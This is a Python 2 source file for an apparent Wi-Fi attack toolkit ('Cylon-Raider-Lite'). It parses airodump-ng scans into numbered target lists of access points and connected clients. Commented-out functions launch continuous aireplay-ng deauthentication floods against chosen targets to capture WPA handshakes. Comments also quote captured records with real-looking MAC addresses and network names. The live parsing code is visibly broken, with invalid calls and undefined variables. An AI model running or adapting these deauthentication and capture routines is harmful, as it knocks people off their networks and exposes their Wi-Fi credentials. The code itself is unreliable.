import os
from os import devnull
import socket
import sys
from multiprocessing import process
import subprocess
from subprocess import Popen, call, PIPE
import re
import time
from sys import argv
from sys import stdout
from termcolor import colored
#import collections

# defining variables
BSSID_targeting_str = 'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID'
CLIENT_targeting_str = 'BSSID              STATION            PWR   Rate    Lost    Frames  Probe'
successful_handshake_capture_str = 'WPA handshake:'
capture_Interface = 'wlan1mon'

# defining temporary files
temp_airodump_recon_capture_file = '/root/Cylon-Raider-Lite/logs/airodump_recon_file_capture.cap'
temp_airodump_recon_csv_file = 'airodump_recon_file_csv_temp.csv'
temp_airodump_recon_file = 'airodump_recon_file_csv_temp.csv'
analysis_file = '/root/Cylon-Raider-Lite/logs/airodump_recon_file_csv_temp.csv'
temp_file_airodump_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_airodump_targeted.csv'
temp_file_BSSID_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_BSSID_targeted.csv'
temp_file_CLIENT_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_CLIENT_targeted.csv'

# defining devnull
DEVNULL = open(os.devnull, 'w')
# sys.stdout = DN

# it should be...
#         1. Recon file
#         2. Parsed into single line target number write_a_d_targeted_bssid files
#         3. Which can be called upon after being printed out again
        # 4. So there is really no "recon file". Its still being parsed into the targeted files
        # 5. instead we can start the airodump again as a subprocess and have the program check for us


# 1. User runs Airmon and Airodump as normal
# 2. Background, subprocess does tjhe same exact thing and records the information on the screen into a file
# 3. As soon as user stops the recon airodump, this toolkit begins the processing phase of the output
# 4. It will determine what part of the screen output is ACCESS POINT targeting. And the other part would be CLIENT mac address targeting
# 5. It auto-saves three temporary files in total, in csv format with the first value being the "target number"
# 6. After processing (it'll take just a split second) this toolkit will re-present the potential targets, and their relative values in being able to have their handshakes stolen (signal quality, clients connected)
# 7. Keys are bound to a numbered list. And it counts from the first BSSID target, to the last CLIENT target
# 8. At this point the three files are "tagged" with that they will do, with the file_type string so the program wont get confused
# 9. So one of the three files (third being the initial recon file) will attack WIRELESS APs, the other one will target connected CLIENTS that were observed on the NETWORK
# 10. All of these files are temporary, only when there is a verified handshake would there be a permanent file saved
# 11. for safe measure since handshakes can still get caught in recon mode, there will always be a condition where, if there is a handshake detected during recon mode, (someone just logged into network), the key is autosaved into a permanent file

target_number = 0

def read_temp_recon_file(temp_airodump_recon_file,target_number):

    # this is why stack overflow sucks, no real concrete answers
    r = open(temp_airodump_recon_file,'r')
    with open(temp_airodump_recon_file,'r') as r:
        try:
            line = r.readline().strip()
            for line in r:
                sentence = str(line)

                # print 'Current Target Number: %s For: %s' % (target_number, sentence)
                for sentence in r:

                    print 'Printing line in 3 seconds'
                    #time.sleep(3)
                    print line
                    print sentence
                    list = []
                    regex_mac_addr = r"^((\d|([a-f]|[A-F])){2}:){5}(\d|([a-f]|[A-F])){2}"
                    sentence = sentence.strip().split(',')
                    # print sentence
                    # target_list.append(sentence)
                    # target_number = target_list.index(sentence)
                    # print colored(target_number,'green',attrs=['bold'])
                    print 'Matching patterns in 3 seconds'
                    #time.sleep(3)
                    for sentence in r:
                        try:
                            if re.match(regex_mac_addr,sentence):
                                print colored(count_value,'yellow',attrs=['bold'])
                                print 'MAC ADDR FOUND'
                                print sentence
                                list = list.append['a']
                                target_number = list.count['a']
                                print sentence, target_number
                                sentence = sentence.split(',')
                                print sentence

                                print colored('DEBUG: reached function identify_and_assign_value_to_field_bssid_targeting(sentence,temp_file_BSSID_targeted, target_number)','red',attrs=['bold'])
                                print sentence
                                try:
                                    string = 'DEBUG: contents of sentence file: %s' % sentence
                                    print colored(string,'yellow',attrs=['bold'])
                                    print sentence
                                    ESSID = sentence[13]
                                    BSSID = sentence[0]
                                    channel = sentence[3]
                                    signal_strength = sentence[8]
                                    encryption = sentence[5:7].join(',')
                                    print colored('TARGET NUMBER: %s \nESSID: %s \nBSSID: %s \nchannel: %s signal_strength: %s \n encryption: %s','red',attrs=['bold']) % (target_number, ESSID, BSSID, channel, signal_strength, encryption)
                                    channel = sentence[3]
                                    signal_strength = sentence[8]
                                    encryption = sentence[5:7].join(',')
                                    print colored('DEBUG: Finished assigning variables','red',attrs=['bold'])
                                    print ESSID, BSSID, channel, signal_strength, encryption

                                    write_to_file(ESSID, BSSID, channel, signal_strength, encryption)

                                except IndexError:
                                    print 'Found a CLIENT string: %s' % sentence
                                    pass
                                return
                                        # except sentence[13] == ValueError:
                                        #     print 'Found a empty ESSID: %s' % sentence[13]
                                        #     if IndexError:
                                        #         pass
                                        #     pass

                            sentence = sentence.split(',')
                            print sentence

                            print colored('DEBUG: reached function identify_and_assign_value_to_field_bssid_targeting(sentence,temp_file_BSSID_targeted, target_number)','red',attrs=['bold'])
                            print sentence
                            try:
                                string = 'DEBUG: contents of sentence file: %s' % sentence
                                print colored(string,'yellow',attrs=['bold'])
                                print sentence
                                ESSID = sentence[13]
                                BSSID = sentence[0]
                                channel = sentence[3]
                                signal_strength = sentence[8]
                                encryption = sentence[5:7].join(',')
                                print colored('TARGET NUMBER: %s \nESSID: %s \nBSSID: %s \nchannel: %s signal_strength: %s \n encryption: %s','red',attrs=['bold']) % (target_number, ESSID, BSSID, channel, signal_strength, encryption)
                                channel = sentence[3]
                                signal_strength = sentence[8]
                                encryption = sentence[5:7].join(',')
                                print colored('DEBUG: Finished assigning variables','red',attrs=['bold'])
                                print ESSID, BSSID, channel, signal_strength, encryption

                                write_to_file(ESSID, BSSID, channel, signal_strength, encryption)

                            except IndexError:
                                print 'Found a CLIENT string: %s' % sentence
                                pass
                                # except sentence[13] == ValueError:
                                #     print 'Found a empty ESSID: %s' % sentence[13]
                                #     if IndexError:
                                #         pass
                                #     pass
                            except IOError:
                                pass
#
# # c = collections.Counter()
# # count_with_previous = 0
# # def a_basic_fucking_counter(count_with_previous):
# #     # where variable could be sentence
# #     count_now = count_with_previous + 1
# #     target_number = count_now
# #
# #     return count_with_previous, count_now,
#
#
# # def match_regex_patterns(line, sentence, r, target_number):
# #     list = []
# #     regex_mac_addr = r"^((\d|([a-f]|[A-F])){2}:){5}(\d|([a-f]|[A-F])){2}"
# #     sentence = sentence.strip().split(',')
# #     # print sentence
# #     # target_list.append(sentence)
# #     # target_number = target_list.index(sentence)
# #     # print colored(target_number,'green',attrs=['bold'])
# #     print 'Matching patterns in 3 seconds'
# #     #time.sleep(3)
# #     for sentence in r:
# #         try:
# #             if re.match(regex_mac_addr,sentence):
# #                 print colored(count_value,'yellow',attrs=['bold'])
# #                 print 'MAC ADDR FOUND'
# #                 print sentence
# #                 list = list.append['a']
# #                 target_number = list.count['a']
# #                 print sentence, target_number
# #                 process_match_variables(sentence, target_number)
# #         except:
# #             pass
# #     process_match_variables(sentence, target_number)
# #     return sentence, line, r
#
# #
# # def process_match_variables(sentence, target_number):
# #     #assign a
# #
# #     sentence = sentence.split(',')
# #     print sentence
# #
# #     identify_and_assign_value_to_field_bssid_targeting(sentence,temp_file_BSSID_targeted, target_number)
# #     return sentence
#
# # new bug, target counter is not increasing!
#
# # def identify_and_assign_value_to_field_bssid_targeting(sentence,temp_file_BSSID_targeted, target_number):
# #     print colored('DEBUG: reached function identify_and_assign_value_to_field_bssid_targeting(sentence,temp_file_BSSID_targeted, target_number)','red',attrs=['bold'])
# #     print sentence
# #     try:
# #         string = 'DEBUG: contents of sentence file: %s' % sentence
# #         print colored(string,'yellow',attrs=['bold'])
# #         print sentence
# #         ESSID = sentence[13]
# #         BSSID = sentence[0]
# #         channel = sentence[3]
# #         signal_strength = sentence[8]
# #         encryption = sentence[5:7].join(',')
# #         print colored('TARGET NUMBER: %s \nESSID: %s \nBSSID: %s \nchannel: %s signal_strength: %s \n encryption: %s','red',attrs=['bold']) % (target_number, ESSID, BSSID, channel, signal_strength, encryption)
# #         channel = sentence[3]
# #         signal_strength = sentence[8]
# #         encryption = sentence[5:7].join(',')
# #         print colored('DEBUG: Finished assigning variables','red',attrs=['bold'])
# #         print ESSID, BSSID, channel, signal_strength, encryption
# #
# #         write_to_file(ESSID, BSSID, channel, signal_strength, encryption)
# #
# #     except IndexError:
# #         print 'Found a CLIENT string: %s' % sentence
# #         pass
# #     # except sentence[13] == ValueError:
# #     #     print 'Found a empty ESSID: %s' % sentence[13]
# #     #     if IndexError:
# #     #         pass
# #     #     pass
# #
# #     return temp_file_BSSID_targeted, target_number, temp_file_BSSID_targeted
# #
# #
# # def write_to_file(ESSID, BSSID, channel, signal_strength, encryption, target_number):
# #     print colored('Successfully reached writing phase','green',attrs=['bold'])
# #     #  = a_basic_fucking_counter(count_with_previous)
# #     write_string = '%s,%s,%s,%s,%s,%s,%s\n' % (target_number, ESSID, BSSID, channel, signal_strength, encryption)
# #     print 'Writing... to file: %s' % temp_file_BSSID_targeted
# #     print colored(write_string,'yellow',attrs=['bold'])
# #     #time.sleep(3)
# #     w = open(temp_file_BSSID_targeted,'w')
# #     w.write(write_string)
# #     w.close()
# #     print 'Writing complete, printing output in 3 seconds'
# #     #time.sleep(3)
# #     string = 'cat %s' % temp_file_BSSID_targeted
# #     os.system(string)
# #     string_output = os.system(string)
# #     print colored(string,'green',attrs=['bold'])
# #     print colored(string_output,'green',attrs=['bold'])
# #     # except IndexError: # meaning that it reached all of the 14-15 field lines and hit its first CLIENT line
# #     #     print colored('Reached end of BSSID Targets','red',attrs=['bold'])
# #     #     pass
# #     return write_string, temp_file_BSSID_targeted,
# #
# #
# # def tester_target_counter(sentence, target_counter):
# #     print colored('DEBUG MODE: Verbose','yellow',attrs=['bold'])
# #     variable_count = -1
# #     for string in sentence[0:]:
# #         variable_count += 1
# #         string = "Variable Count: %s Field Content: %s" % (variable_count, string)
# #         print colored(string,'green',attrs=['bold'])
# # # TARGET #:
# # # 1
# # # ['9C:34:26:FC:11:6F', ' 2017-05-19 22:55:42', ' 2017-05-19 23:04:49', '  6', '  54', ' WPA2 WPA', ' CCMP TKIP', 'PSK', ' -88', '       52', '        0', '   0.  0.  0.  0', '   8', ' Madden01', ' \r\n']
# # # DEBUG MODE: Verbose
# # # Variable Count: 0 Field Content: 9C:34:26:FC:11:6F
# # # Variable Count: 1 Field Content:  2017-05-19 22:55:42
# # # Variable Count: 2 Field Content:  2017-05-19 23:04:49
# # # Variable Count: 3 Field Content:   6
# # # Variable Count: 4 Field Content:   54
# # # Variable Count: 5 Field Content:  WPA2 WPA
# # # Variable Count: 6 Field Content:  CCMP TKIP
# # # Variable Count: 7 Field Content: PSK
# # # Variable Count: 8 Field Content:  -88
# # # Variable Count: 9 Field Content:        52
# # # Variable Count: 10 Field Content:         0
# # # Variable Count: 11 Field Content:    0.  0.  0.  0
# # # Variable Count: 12 Field Content:    8
# # # Variable Count: 13 Field Content:  Madden01
# # # Variable Count: 14 Field Content:
# # #
# #
# # def write_the_string_to_new_file(write_string, temp_file_BSSID_targeted):
# #     w = open(temp_file_BSSID_targeted,'w')
# #     w.write(write_string)
# #     w.close()
# #     print colored('STRING: %s WRITTEN TO: %s','red',attrs=['bold']) % (write_string, temp_file_BSSID_targeted)
# #     cmd_String = 'cat %s' % temp_file_BSSID_targeted
# #     os.system(cmd_String) # to check that the string is properly written
# #     return temp_file_BSSID_targeted
# #
# #
# # ## old method
# #
# # def subproc_generate_recon_file(temp_airodump_recon_file, successful_handshake_capture_str):
# #     try:
# #         cmd_String = "airodump-ng wlan1mon --write %s" % (temp_airodump_recon_capture_file)
# #         subproc = subprocess.Popen(cmd_String, stderr=STDOUT, stdout=subprocess.PIPE)
# #         output = subproc.communicate()
# #         w = open(temp_airodump_recon_file,'w')
# #         w.write(output)
# #         if re.match(successful_handshake_capture_str, output):
# #             sentence = output.split(':')
# #             unexpected_BSSID = sentence[1]
# #             permanent_capture_file = unexpected_BSSID + '_permanent_capture_handshake_unexpected.cap'
# #             print 'ALERT: A handshake was detected whether or not you intended to capture it'
# #             print 'It is autosaved as %s' % permanent_capture_file
# #             os.system('cp -r %s %s') % (temp_airodump_recon_capture_file, permanent_capture_file)
# #         w.close()
# #     except KeyboardInterrupt:
# #         print 'Temporary recon file saved as: %s' % permanent_capture_file
# #         print 'Sending it in for parsing in the engine'
# #         determine_type_of_file(temp_airodump_recon_file)
# #     return temp_airodump_recon_file, output
# #
# #
# # def write_a_d_targeted_bssid(
# #             target_counter,
# #             BSSID,
# #             ESSID,
# #             channel,
# #             signal_strength,
# #             encryption,
# #             cipher,
# #             key_type,
# #             broadcast_announcements,
# #             data_packets,
# #             dp_per_sec,
# #             max_net_speed,
# #             temp_file_airodump_targeted):
# #         print 'Writing temporary ACCESS POINT-targeting save file'
# #
# #         write_string = '%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s\n' % (
# #         BT_,
# #         BSSID,
# #         ESSID,
# #         channel,
# #         signal_strength,
# #         encryption,
# #         cipher,
# #         key_type,
# #         broadcast_announcements,
# #         data_packets,
# #         dp_per_sec,
# #         max_net_speed,
# #         file_type)
# #
# #         write_string = write_string.strip().split()
# #
# #         w = open(temp_file_airodump_targeted,'w')
# #         w.write(write_string)
# #         w.close()
# #         print 'Done, please proceed to the final stage of the attack in the Main Menu, the Deauthorize-and-Replay-Attack'
# #         display_targets(temp_file_CLIENT_targeted, temp_file_BSSID_targeted)
# #         return temp_file_BSSID_targeted
# #
# # def write_a_d_targeted_client(
# #                         CT_,
# #                         BSSID,
# #                         signal_strength,
# #                         broadcast_announcements,
# #                         data_packets,
# #                         dp_per_sec,
# #                         channel,
# #                         max_net_speed,
# #                         encryption,
# #                         cipher,
# #                         key_type,
# #                         ESSID,
# #                         file_type):
# #         print 'Writing temporary CLIENT-targeting save file'
# #         write_string = '%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s\n' % (CT_,
# #             BSSID,
# #             signal_strength,
# #             broadcast_announcements,
# #             data_packets,
# #             dp_per_sec,
# #             channel,
# #             max_net_speed,
# #             encryption,
# #             cipher,
# #             key_type,
# #             ESSID,
# #             file_type
# #         )
# #         w = open(temp_file_CLIENT_targeted,'w')
# #         w.write(write_string)
# #         w.close()
# #         print 'Done, please proceed to the final stage of the attack in the Main Menu, the Deauthorize-and-Replay-Attack'
# #         return temp_file_CLIENT_targeted
# # def display_targets(temp_file_CLIENT_targeted, temp_file_BSSID_targeted):
# #     print 'Here are your BSSID (Wireless AP Targets)'
# #     cmd_String = 'cat %s' % temp_file_BSSID_targeted # this is where the bug is at, the files are apparantly neot created
# #     os.system(cmd_String)
# #     print 'Here are your CONNECTED WIRELESS CLIENT Targets'
# #     cmd_String = 'cat %s' % temp_file_CLIENT_targeted
# #     os.system(cmd_String)
# #     print 'Which method do you wish to use?'
# #
# #     print """
# #
# #     \t\t#1. Traditional BSSID Deauthorization/Replay-Attack
# #
# #     \t\t#2. Target a Connected Wireless Client Instead (More effective)
# #
# #     """
# #
# #     opt_Choice = str(raw_input("Enter a OPTION: "))
# #
# #     if opt_Choice == "1":
# #         file_type = 'aireplay_target_bssid'
# #         determine_targeted_capture(file_type)
# #         main()
# #     elif opt_Choice == "2":
# #         file_type = 'aireplay_target_client'
# #         determine_targeted_capture(file_type)
# #         main()
# #     elif opt_Choice == "0":
# #         main()
# #     else:
# #         print 'You have entered a invalid option'
# #         main()
# #         return
# #
# # def write_config_file(file_type):
# #     if file_type == 'aireplay_target_bssid':
# #         write_a_d_targeted_bssid(
# #                     CT_,
# #                     BSSID,
# #                     ESSID,
# #                     channel,
# #                     signal_strength,
# #                     encryption,
# #                     cipher,
# #                     key_type,
# #                     broadcast_announcements,
# #                     data_packets,
# #                     dp_per_sec,
# #                     max_net_speed,
# #                     file_type
# #         )
# #     elif file_type == 'aireplay_target_client':
# #         write_a_d_targeted_client(
# #                     BSSID,
# #                     signal_strength,
# #                     broadcast_announcements,
# #                     data_packets,
# #                     dp_per_sec,
# #                     channel,
# #                     max_net_speed,
# #                     encryption,
# #                     cipher,
# #                     key_type,
# #                     ESSID,
# #                     file_type
# #
# #         )
# #     return config_file, file_type, BT_CT_target_counter, signal_strength, broadcast_announcements, data_packets, dp_per_sec, channel, max_net_speed, encryption, cipher, key_type, ESSID, connected_AP, data_rate, lost_packets, frames, AP_probes
# #
# # def targeted_capture_subproc(BSSID, channel):
# #     capture_Interface = 'wlan1mon'
# #     logfile_dir = '/root/Cylon-Raider-Lite/Cylon-Raider-Lite/logs/'
# #     permanent_capture_file = logfile_dir + BSSID + 'perm_capture.cap'
# #     cmd_String = "airodump-ng --bssid {0} -c {1} --write {2} {3}".format(
# #         BSSID,
# #         channel,
# #         permanent_capture_file,
# #         capture_Interface
# #         )
# #     subproc = subprocess.Popen(cmd_String)
# #     output = subproc.communicate()
# #     return output, permanent_capture_file
# #
# # def launch_attack_bssid(BSSID, signal_strength, broadcast_announcements, data_packets, dp_per_sec, channel, max_net_speed, encryption, cipher, key_type, ESSID):
# #     capture_Interface = 'wlan1mon'
# #     print """
# #     TARGET PROFILE
# #     BSSID: {0} ESSID: {1} CHANNEL: {2} ENCRYPTION: {4} CIPHER: {5} KEY: {6} SIGNAL: {7}
# #     """.format(BSSID, ESSID, channel, encryption, cipher, key_type, signal_strength)
# #     print 'Launching attack in 5 seconds, please do not disconnect or loosen your external wifi card'
# #     #time.sleep(5)
# #     targeted_capture_subproc(BSSID, channel)
# #     cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one {1}".format(BSSID, capture_Interface)
# #     os.system(cmd_String)
# #     if targeted_capture_subproc(BSSID, channel) == successful_handshake_capture_str:
# #         print 'WPA handshake captured'
# #         print 'Creds are located in permanent capture file: %s' % permanent_capture_file
# #         exit(0)
# #     return
# #
# # def launch_attack_client(connected_AP, client_MAC_addr, signal_strength, data_rate, lost_packets, frames, AP_probes):
# #     capture_Interface = 'wlan1mon'
# #     print """
# #     TARGET PROFILE
# #     CLIENT MAC ADDRESS: {0} CONNECTED AP: {1} ACCESS POINTS PROBED BY CLIENT: {2} SIGNAL: {3}
# #     """.format(client_MAC_addr, connected_AP, AP_probes, signal_strength)
# #     print 'Launching attack in 5 seconds, please do not disconnect or loosen your external wifi card'
# #     #time.sleep(5)
# #     targeted_capture_subproc(BSSID, channel)
# #
# #     capture_BSSID = BSSID
# #     client_mac = client_MAC_addr
# #     cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
# #         client_mac,
# #         capture_BSSID,
# #         capture_Interface
# #         )
# #     os.system(cmd_String)
# #     if targeted_capture_subproc(BSSID, channel) == successful_handshake_capture_str:
# #         print 'WPA handshake captured'
# #         print 'Creds are located in permanent capture file: %s' % permanent_capture_file
# #         exit(0)
# #
# #     return
# #
# # def determine_targeted_capture(file_type):
# #     if file_type == 'aireplay_target_bssid':
# #         config_file = temp_file_BSSID_targeted
# #         target_chosen = read_config_file(config_file, file_type)
# #         targeted_capture()
# #         launch_attack_bssid()
# #     elif file_type == 'aireplay_target_client':
# #         config_file = temp_file_CLIENT_targeted
# #         target_chosen = read_config_file(config_file, file_type)
# #         targeted_capture()
# #         launch_attack_client()
# #
# #     return file_type, config_file
# #
# # def read_config_file(config_file, file_type):
# #     if file_type == 'aireplay_target_bssid':
# #         print 'WIRELESS AP TARGETS'
# #         cmd_String = 'cat %s' % temp_file_BSSID_targeted
# #         os.system(cmd_String)
# #         target_chosen = str(raw_input("Enter the listed number of your target: "))
# #         r = open(temp_file_BSSID_targeted,'r')
# #         line = r.readline().strip()
# #         sentence = line.split(',')
# #         if re.findall(target_chosen,sentence[0]):
# #             BSSID = sentence[0]
# #             signal_strength = sentence[1]
# #             broadcast_announcements = sentence[2]
# #             data_packets = sentence[3]
# #             dp_per_sec = sentence[4]
# #             channel = sentence[5]
# #             max_net_speed = sentence[6]
# #             encryption = sentence[7]
# #             cipher = sentence[8]
# #             key_type = sentence[9]
# #             ESSID = sentence[10]
# #             launch_attack_bssid(BSSID, signal_strength, broadcast_announcements, data_packets, dp_per_sec, channel, max_net_speed, encryption, cipher, key_type, ESSID)
# #         else:
# #             print 'That target does not exist'
# #     elif file_type == 'aireplay_target_client':
# #         print 'CLIENT TARGETS (more effective)'
# #         cmd_String = 'cat %s' % temp_file_CLIENT_targeted
# #         os.system(cmd_String)
# #         target_chosen = str(raw_input("Enter the listed number of your target: "))
# #         r = open(temp_file_CLIENT_targeted,'r')
# #         line = r.readline().strip()
# #         sentence = line.split(',')
# #         if re.findall(target_chosen,sentence[0]):
# #             connected_AP = sentence[0]
# #             client_MAC_addr = sentence[1]
# #             signal_strength = sentence[2]
# #             data_rate = sentence[3:5]
# #             lost_packets = sentence[6]
# #             frames = sentence[7]
# #             AP_probes = sentence[8]
# #             launch_attack_client(connected_AP, client_MAC_addr, signal_strength, data_rate, lost_packets, frames, AP_probes)
# #         else:
# #             print 'That target does not exist'
# #
# #     return target_chosen
# #
# # # def make_csv_recon_file():
# # #     airodump_csv_output = '/root/Cylon-Raider-Lite/logs/airodump_recon_file_csv*.csv'
# # #     analysis_file = '/root/Cylon-Raider-Lite/logs/airodump_recon_file_csv_temp.csv'
# # #     cmd_String = 'cat %s > %s' % (airodump_csv_output, analysis_file)
# # #     os.system(cmd_String)
# # #     determine_type_of_file(analysis_file)
# # #
# # #     return analysis_file
# # target_counter = 0
# #
# # global paragraph
# #
# # def determine_type_of_file(temp_airodump_recon_file): # this is a lot of data. Too many repeative information.
# # # Its better to run each BSSID and CLIENT MAC against a list, so if its not not on the list then its a new unique device
# # # the first string of the BSSID targeting meneu is "BSSID"
# #     r = open(temp_airodump_recon_file,'r')
# #     paragraph = r.readlines()
# #     paragraph = str(paragraph)
# #     split_paragraph_bssid_and_client(paragraph)
# #     r.close()
# #     return paragraph
# #
# # def split_paragraph_bssid_and_client(paragraph):
# #     paragraph = paragraph.strip().split('STATION MAC')
# #     print paragraph
# #     # BSSID_attack_paragraph = paragraph[0]
# #     # CLIENT_attack_paragraph = paragraph[1]
# #     print 'PRINTING BSSID PARAGRAPH'
# #     #time.sleep(3)
# #     print BSSID_attack_paragraph
# #     print 'PRINTING CLIENT ATTACK PARAGRAPH'
# #     #time.sleep(3)
# #     print CLIENT_attack_paragraph
# #     return BSSID_attack_paragraph, CLIENT_attack_paragraph
# #
# # def split_lines_headers_and_entries(BSSID_attack_paragraph, CLIENT_attack_paragraph):
# #     BSSID_paragraph = BSSID_paragraph.split('Key') # we have to split it either after "Key" or just add the term Key back again Because that represnets the "leftmost area of the split"
# #     BSSID_headers = BSSID_paragraph[0]
# #     BSSID_entries = BSSID_paragraph[1]
# #     line_bssid = BSSID_entries.readline().strip() # each line = unique device
# #     sentence = str(line_bssid)
# #     print 'PRINTING SENTENCE'
# #     #time.sleep(5)
# #     print sentence
# #             # need to add the term "Key" back into the heading
# #             # Sample BSSID targeting line
# #
# # # BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
# # # 58:8B:F3:DA:0D:A3, 2017-05-19 22:55:52, 2017-05-19 23:03:09,  6,  54, WPA2 WPA, CCMP TKIP,PSK, -89,        4,        0,   0.  0.  0.  0,  15, CenturyLink4473,
# #
# # # Sample CLIENT targeting line
# # #Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
# # # B4:3A:28:FC:B6:48, 2017-05-19 23:04:03, 2017-05-19 23:04:03,  -1,        1, BC:EE:7B:7C:C4:08,
# #
# #
# # def split_sentences_by_field(target_counter, BSSID_entries, sentence):
# #     for sentence in BSSID_entries:
# #         #if sentence != sentence: this doesnt make any sense. There should be a better way, like re.match
# #         target_counter += 1
# #         sentence = sentence.split()
# #
# #
# #
# #     # CLIENT_paragraph = paragraph[1]
# #
# #     # print paragraph[1], CLIENT_paragraph
# # # The first string of the CLIENT targetieng menu is "STATION MAC"
# # #
# # # You split the paragraph by the second to createa  perfect split
# #
# #
# # # # all this shit down here has to be done all over again, it looks different on a PC than on my android tablet
# # #     global file_type
# # #     file_type = 'recon_file'
# # #     target_counter = 0
# # #     r = open(temp_airodump_recon_file,'r')
# # #     with open(temp_airodump_recon_file,'r') as r:
# # #         line = r.readline().strip()
# # #         sentence = str(line)
# # #         print 'Analyzing string %s' % sentence
# # #         if re.match(BSSID_targeting_str,sentence):
# # #             print 'Found to be BSSID-targeting parameters, parsing...'
# # #             following_line = r.next().strip() # so this doesnt work. The entire file must be split along somewhere.
# # #             file_type = 'aireplay_target_bssid'
# # #             target_counter += 1
# # #             BT_ = target_counter
# # #             sentence = sentence.strip().split()
# # #             BSSID = sentence[0]
# # #             signal_strength = sentence[1]
# # #             broadcast_announcements = sentence[2]
# # #             data_packets = sentence[3]
# # #             dp_per_sec = sentence[4]
# # #             channel = sentence[5]
# # #             max_net_speed = sentence[6]
# # #             encryption = sentence[7]
# # #             cipher = sentence[8]
# # #             key_type = sentence[9]
# # #             ESSID = sentence[10]
# # #             write_config_file(file_type)
# # #         if re.match(CLIENT_targeting_str,sentence):
# # #             print 'Found to be CLIENT-targeting parameters, parsing...'
# # #             following_line = r.next().strip
# # #             file_type = 'aireplay_target_client'
# # #             target_counter += 1
# # #             CT_ = target_counter
# # #             sentence = sentence.replace('(not associated)','NONE')
# # #             sentence = sentence.strip().split()
# # #             connected_AP = sentence[0]
# # #             client_MAC_addr = sentence[1]
# # #             signal_strength = sentence[2]
# # #             data_rate = sentence[3:5]
# # #             lost_packets = sentence[6]
# # #             frames = sentence[7]
# # #             AP_probes = sentence[8]
# #             write_config_file(file_type)
# #         # except:
# #         #     pass
# #         # return file_type, BT_CT_target_counter, signal_strength, broadcast_announcements, data_packets, dp_per_sec, channel, max_net_speed, encryption, cipher, key_type, ESSID, connected_AP, data_rate, lost_packets, frames, AP_probes
